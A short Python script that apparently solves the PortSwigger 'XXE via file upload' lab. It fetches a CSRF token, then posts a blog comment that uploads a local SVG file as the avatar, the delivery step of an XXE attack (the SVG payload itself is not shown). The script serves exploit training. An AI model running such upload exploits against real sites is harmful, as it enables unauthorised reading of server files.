"""
https://portswigger.net/web-security/xxe/lab-xxe-via-file-upload
"""

import sys
import requests
from bs4 import BeautifulSoup

site = sys.argv[1]
if 'https://' in site:
    site = site.rstrip('/').lstrip('https://')

s = requests.Session()

post_url = f'https://{site}/post?postId=1'
resp = s.get(post_url)
soup = BeautifulSoup(resp.text,'html.parser')
csrf = soup.find('input', {'name':'csrf'}).get('value')

comment_url = f'https://{site}/post/comment'

multipart_form_data = {
    'csrf' : (None, csrf),
    'postId' : (None, '1'),
    'comment' : (None, 'Nice blog.  Be a shame if anything happened to it.'),
    'name' : (None, 'Brandon'),
    'email' : (None, 'baa@pdx.edu'),
    'website': (None, 'https://pdx.edu'),
    'avatar' : ('avatar.svg', open('file.svg', 'rb'))
}

resp = s.post(comment_url, files=multipart_form_data)